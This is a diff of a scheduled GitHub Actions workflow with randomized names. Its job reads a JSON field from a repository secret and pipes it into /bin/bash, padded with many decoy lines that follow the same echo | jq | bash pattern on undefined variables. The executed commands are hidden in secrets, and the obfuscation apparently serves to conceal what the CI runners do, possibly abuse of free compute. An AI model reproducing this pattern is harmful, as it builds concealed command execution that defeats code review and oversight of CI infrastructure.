@@ -1,29 +1,29 @@
 name: lanxingjian6543
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 3/6 * * *'
-jobs:  # 19108
+    - cron: '4 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lanxingjian6543
         env:
-          pcxxd67417: ${{ secrets.pcxxd67417 }}
+          cme2975: ${{ secrets.cme2975 }}
         run: |
-          echo $pcxxd67417 | jq -r .mgwsn5386 | /bin/bash
-          echo $mtp441 | jq -r .nxomy823 | /bin/bash
-          echo $ibk784 | jq -r .dqk115 | /bin/bash
-          echo $za0 | jq -r .znz039 | /bin/bash
-          echo $vms23586 | jq -r .ejzbh841 | /bin/bash
-          echo $t183 | jq -r .qd4 | /bin/bash
-          echo $an52 | jq -r .t6 | /bin/bash
-          echo $uau22 | jq -r .foizd70 | /bin/bash
-          echo $f3316 | jq -r .jb9209 | /bin/bash
-          echo $q2 | jq -r .gh9 | /bin/bash
-          echo $yjuzv26674 | jq -r .mhb78279 | /bin/bash
-          echo $p9342 | jq -r .jya74 | /bin/bash
+          echo $cme2975 | jq -r .coati16069 | /bin/bash
+          echo $qz43876 | jq -r .r8 | /bin/bash
+          echo $fwwwo0 | jq -r .axtcx1326 | /bin/bash
+          echo $o66 | jq -r .ns62 | /bin/bash
+          echo $zbut41 | jq -r .de89 | /bin/bash
+          echo $fqlxq69845 | jq -r .p89806 | /bin/bash
+          echo $lxvpg3540 | jq -r .gw21944 | /bin/bash
+          echo $usf37 | jq -r .q6 | /bin/bash
+          echo $i92548 | jq -r .uidjm71 | /bin/bash
+          echo $dieg22 | jq -r .w11473 | /bin/bash
+          echo $jcoll2 | jq -r .b34 | /bin/bash
+          echo $wpb33 | jq -r .rfqye76 | /bin/bash
+          echo $g91824 | jq -r .eeojb6 | /bin/bash
 
